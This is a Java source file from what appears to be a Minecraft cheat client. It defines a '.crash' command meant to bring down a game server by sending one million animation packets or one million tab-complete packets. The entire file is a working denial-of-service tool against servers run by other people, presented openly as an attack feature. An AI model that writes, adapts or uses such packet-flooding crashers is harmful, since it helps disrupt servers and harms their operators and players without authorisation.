package de.crazymemecoke.features.commands;

import de.crazymemecoke.manager.commandmanager.Command;
import de.crazymemecoke.utils.Notify;
import de.crazymemecoke.utils.Wrapper;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C14PacketTabComplete;

public class Crash extends Command {

    String syntax = ".crash <packetanimation/tabcomplete>";

    @Override
    public void execute(String[] args) {
        if (args.length == 1) {
            if (args[0].equalsIgnoreCase("packetanimation")) {
                for (int i = 0; i < 1000000; i++) {
                    Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
                }
            } else if (args[0].equalsIgnoreCase("tabcomplete")) {
                for (int i = 0; i < 1000000; i++) {
                    Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
                }
            } else {
                Notify.chat(syntax);
            }
        } else {
            Notify.chat(syntax);
        }
    }

    @Override
    public String getName() {
        return "Crash";
    }

}